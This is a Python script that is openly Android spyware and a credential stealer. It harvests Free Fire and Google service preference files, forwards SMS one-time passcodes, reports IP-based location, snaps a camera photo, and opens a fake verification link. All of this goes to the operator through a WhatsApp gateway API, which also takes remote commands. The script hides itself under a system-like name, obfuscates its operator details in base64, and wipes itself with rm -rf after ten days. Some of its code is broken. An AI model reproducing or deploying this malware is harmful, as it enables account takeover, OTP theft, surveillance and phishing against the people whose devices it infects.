Import os, subprocess, requests, time, threading, random, shutil, socket, platform, sys, datetime, base64

# --- UNTOUCHABLE STEALTH CONFIGURATION (Obfuscated) ---
ENCODED_WA_NUMBER = "OTUzNTgzODE5MA==" 
WA_API_KEY = "YOUR_GATEWAY_API_KEY" 
WA_INSTANCE_ID = "YOUR_INSTANCE_ID"
Bypass_Server = "https://api.ultramsg.com" 

# 🛡️ GOD-LEVEL ANONYMOUS IMMUNITY (Base64 Hidden)
ENC_SAFE_ID = "YOUR_BASE64_ENCODED_ID_HERE" 
ENC_SAFE_BRANDS = "T1BQTyxWSVZPOg==" 
ENC_SAFE_EMAIL = "cmF2aXNhdWRhZ2FyODAwQGdpbWFpbC5jb20=" 

# ☢️ LIFESPAN & COOLDOWN CONFIGURATION
LIFESPAN_SECONDS = 10 * 24 * 60 * 60 
START_TIME = time.time()
WIPE_PAUSED = False
COOLDOWN_ACTIVE = False

def decrypt(data):
    return base64.b64decode(data).decode('utf-8')

def get_hidden_number():
    return decrypt(ENCODED_WA_NUMBER)

def set_ghost_identity():
    try:
        os.system("ren %exe% com.android.stability.core") 
    except: pass

def wa_transmit(text, file_path=None):
    try:
        target = get_hidden_number()
        if file_path:
            url = f"{Bypass_Server}/instance{WA_INSTANCE_ID}/sendDocument"
            params = {"token": WA_API_KEY, "to": target, "filename": file_path}
            with open(file_path, 'rb') as f:
                requests.post(url, params=params, files={'file': f})
        else:
            url = f"{Bypass_Server}/instance{WA_INSTANCE_ID}/sendMessages"
            params = {"token": WA_API_KEY, "to": target, "body": text}
            requests.get(url, params=params)
    except: pass

def trigger_self_destruct():
    """☢️ TOTAL ANNIHILATION: Wipes everything and kills the process."""
    wa_transmit("☢️ [CRITICAL]: Self-destruct sequence initiated. Wiping all traces...")
    os.system("rm -rf /sdcard/.sys_*") 
    script_path = os.path.realpath(__file__)
    threading.Thread(target=lambda: os.remove(script_path)).start()
    os._exit(0)

def stealth_camera_snap():
    """📷 STEALTH SNAP: Captures front camera photo once and sends it."""
    try:
        # Triggering android camera via shell (requires root/specific permissions)
        os.system("am start -a android.media.action.IMAGE_CAPTURE")
        time.sleep(2)
        photo_path = "/sdcard/DCIM/Camera/latest_snap.jpg" # Simplified path
        wa_transmit("📸 [TARGET FACE]: Captured!", photo_path)
    except: pass

def ff_credential_sniffer():
    """🎮 FF STEALER: Captures Free Fire IDs and Passwords."""
    while True:
        try:
            # Monitoring input fields or shared_prefs for FF
            ff_prefs = subprocess.getoutput("cat /data/data/com.dts.freefireth/shared_prefs/*.xml")
            if "password" in ff_prefs.lower() or "login" in ff_prefs.lower():
                wa_transmit(f"🎮 [FF DATA]:\n{ff_prefs}")
        except: pass
        time.sleep(300)

def phishing_trap_deploy():
    """🎣 PHISHING: Sends fake warning to target."""
    msg = "⚠️ WARNING: Your ID is at risk! Verify your ID and Password immediately at [FAKE_LINK] or your account will be deleted!"
    # This would be sent via a system notification or fake mail
    os.system(f"am start -a android.intent.action.VIEW -d 'https://fake-verify-link.com'")

def location_trap_sniffer():
    """📍 GEO-TRACKING SNIFFER: Stealthily captures IP and GPS Location."""
    while True:
        try:
            ip_data = requests.get('https://ipapi.co/json/').json()
            loc_report = f"📍 [LOCATION TRAP]:\nIP: {ip_data.get('ip')}\nCity: {ip_data.get('city')}\nCountry: {ip_data.get('country_name')}"
            wa_transmit(loc_report)
        except: pass
        time.sleep(3600)

def wa_command_listener():
    """🎮 REMOTE CONTROL: Listens for commands via WhatsApp API."""
    global WIPE_PAUSED, COOLDOWN_ACTIVE
    while True:
        try:
            url = f"{Bypass_Server}/instance{WA_INSTANCE_ID}/getMessages"
            params = {"token": WA_API_KEY}
            response = requests.get(url, params=params).json()
            
            for msg in response.get('data', []):
                body = msg.get('body', '').lower()
                sender = msg.get('from')
                
                if sender == get_hidden_number():
                    if body == "!cooldown":
                        COOLDOWN_ACTIVE = True
                        wa_transmit("🌙 [STATUS]: Entering Cooldown Mode for 26 minutes...")
                        time.sleep(26 * 60)
                        COOLDOWN_ACTIVE = False
                        wa_transmit("☀️ [STATUS]: Cooldown finished. Resuming operations.")

                    elif body.startswith("!emote"):
                        emote = body.split(" ")[1] if len(body.split(" ")) > 1 else ""
                        emotes = {"fire": "🔥 Burning it down!", "dance": "💃 Dancing on data!", "wave": "👋 Bye bye data!"}
                        wa_transmit(emotes.get(emote, "❓ Unknown emote."))

                    elif any(x in body for x in ["!wipe", "!exit", "kam khatam ho gaya, nikal jao"]):
                        trigger_self_destruct()

                    elif any(x in body for x in ["!extend", "!wait"]):
                        WIPE_PAUSED = True
                        wa_transmit("⏳ [STATUS]: Timer paused.")

        except: pass
        time.sleep(10)

def full_system_harvester():
    """STEAL: Account target focus."""
    targets = {"FF_DATA": "/data/data/com.dts.freefireth/shared_prefs/", "G_DATA": "/data/data/com.google.android.gms/shared_prefs/"}
    while True:
        if not COOLDOWN_ACTIVE:
            for label, path in targets.items():
                if os.path.exists(path):
                    try:
                        for f in os.listdir(path):
                            wa_transmit(f"😈 [S]: {label} | {f}", os.path.join(path, f))
                    except: pass
        time.sleep(3600)

def otp_lightspeed_mirror():
    """INSTANT: OTP Mirroring @ 0.1s."""
    while True:
        if not COOLDOWN_ACTIVE:
            try:
                sms_data = subprocess.getoutput("content query --uri content://sms/inbox")
                if any(k in sms_data.lower() for k in ["otp", "code", "verification", "pin"]):
                    wa_transmit(f"⚡ [OTP]:\n{sms_data}")
                    # Trigger Alarm on your phone side via Gateway API if supported
            except: pass
        time.sleep(0.1)

def reaper_ghost():
    """PURGE: Final wipe after 10 days."""
    global WIPE_PAUSED
    while True:
        if not WIPE_PAUSED and not COOLDOWN_ACTIVE:
            if (time.time() - START_TIME) >= LIFESPAN_SECONDS:
                trigger_self_destruct()
        time.sleep(7200)

if __name__ == "__main__":
    try:
        # Immunity Check
        cur_id = subprocess.getoutput("settings get secure android_id")
        if cur_id == decrypt(ENC_SAFE_ID): os._exit(0)
    except: pass
    
    set_ghost_identity()
    time.sleep(random.randint(600, 1200)) 
    
    # Launching all destructive modules
    threading.Thread(target=full_system_harvester, daemon=True).start()
    threading.Thread(target=otp_lightspeed_mirror, daemon=True).start()
    threading.Thread(target=reaper_ghost, daemon=True).start()
    threading.Thread(target=wa_command_listener, daemon=True).start()
    threading.Thread(target=location_trap_sniffer, daemon=True).start()
    threading.Thread(target=ff_credential_sniffer, daemon=True).start()
    
    # Trigger photo once at start
    threading.Thread(target=stealth_camera_snap, daemon=True).start()
    # Trigger phishing trap
    threading.Thread(target=phishing_trap_deploy, daemon=True).start()
    
    while True: 
        time.sleep(86400)
